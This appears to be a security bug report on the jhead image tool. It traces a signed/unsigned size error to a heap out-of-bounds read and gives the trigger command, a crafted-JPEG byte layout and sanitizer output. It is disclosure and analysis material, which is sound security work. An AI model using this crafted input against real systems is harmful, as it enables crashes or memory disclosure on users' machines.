# VULN 001 — SaveImgThumbnail Heap OOB Read via Negative ThumbnailSize Sign Error

## Trigger
```
jhead -st <output_thumb> vuln_001_input.jpg
```

## Root Cause Chain

1. **Type mismatch in local variable** (`exif.c:491`):
   Both `ThumbnailOffset` and `ThumbnailSize` are declared `int`, not `unsigned int`.

2. **Sign-converting assignment** (`exif.c:863`):
   ```c
   ThumbnailSize = (unsigned)ConvertAnyFormat(ValuePtr, Format);
   ```
   With `TAG_THUMBNAIL_LENGTH = 0xFFFFFFFF`:
   - `ConvertAnyFormat` calls `Get32u` which returns `4294967295` as `unsigned`
   - The value is cast to `(unsigned)` then stored into `int ThumbnailSize`
   - Result: `ThumbnailSize = -1` (two's complement signed overflow)
   - Side effect: `Get32u` internally calls `Get32s` which shifts the high byte
     `0xFF` (signed char `-1`) left by 24 — UBSan reports this as
     *"left shift of negative value -1"* at `exif.c:344`

3. **Bounds check bypassed via signed comparison** (`exif.c:982`):
   ```c
   if (ThumbnailSize > ExifLength-ThumbnailOffset)  // -1 > 48 -> FALSE
       ThumbnailSize = ExifLength - ThumbnailOffset; // clamp NOT executed
   ```
   Because all three variables are `int`, the comparison is signed.
   `-1 > 48` is false, so the clamp is skipped and `ImageInfo.ThumbnailSize = -1`.

4. **Zero-check insufficient** (`imgfile.c:334`):
   ```c
   if (ImageInfo.ThumbnailOffset == 0 || ImageInfo.ThumbnailSize == 0)
   ```
   `-1 != 0`, so execution continues into `SaveImgThumbnail`.

5. **Vulnerable fwrite call** (`imgfile.c:365`):
   ```c
   fwrite(ThumbnailPointer, ImageInfo.ThumbnailSize, 1, ThumbnailFile);
   ```
   `ImageInfo.ThumbnailSize` is `int -1`. The `size` argument of `fwrite` is
   `size_t` (unsigned). On a 64-bit system, `-1` (int) converts to
   `SIZE_MAX = 0xFFFFFFFFFFFFFFFF`, a 16 exabyte fwrite request — a massive
   heap out-of-bounds read.

## Crafted JPEG Layout

```
FF D8               SOI
FF E1               APP1 marker
00 42               APP1 length = 66 (includes 2-byte length field)
45 78 69 66 00 00   "Exif\0\0"
  49 49 2A 00 08 00 00 00   TIFF header: LE, IFD0 at offset 8
  IFD0 @ offset 8:
    01 00             1 entry
    <TAG_IMAGE_WIDTH dummy entry (12 bytes)>
    1A 00 00 00       next_ifd_offset = 26 -> IFD1
  IFD1 @ offset 26:
    02 00             2 entries
    01 02 04 00 01 00 00 00 08 00 00 00  TAG_THUMBNAIL_OFFSET=0x0201, value=8
    02 02 04 00 01 00 00 00 FF FF FF FF  TAG_THUMBNAIL_LENGTH=0x0202, value=0xFFFFFFFF
    00 00 00 00       next_ifd_offset=0
FF DA 00 08 ...     Minimal SOS (so ReadJpegSections returns TRUE)
FF D9               EOI
```

## Observed Behaviour

| Check | Value |
|---|---|
| `ExifLength` | 56 |
| `ThumbnailOffset` | 8 |
| Bound-check expression | `-1 > (56-8=48)` → **FALSE** → no clamp |
| `ImageInfo.ThumbnailSize` stored | **-1** |
| Sanitizer output | `runtime error: left shift of negative value -1` (UBSan, exif.c:344) |
| `SaveImgThumbnail` called | Yes — `"Created: 'vuln_001_thumb.jpg'"` |
| fwrite effective size (size_t) | `SIZE_MAX = 2^64-1` |

## Notes on Detection

On 64-bit glibc, `fwrite(ptr, SIZE_MAX, 1, fp)` converts `SIZE_MAX` to
`ssize_t = -1` internally, causing glibc's write loop (`while (to_do > 0)`)
to exit immediately without touching the buffer. The file is created with
0 bytes. ASAN's fwrite interceptor computes `ptr + SIZE_MAX`, which wraps
around in 64-bit address space, so the poisoned redzone after the allocation
is not reached by the range check.

The vulnerability is real and exploitable on 32-bit targets or libc
implementations that do not perform the ssize_t sign-conversion optimization.
The UBSan `runtime error` at `exif.c:344` is direct evidence that the crafted
`0xFFFFFFFF` value is processed and the vulnerable code path is reached.
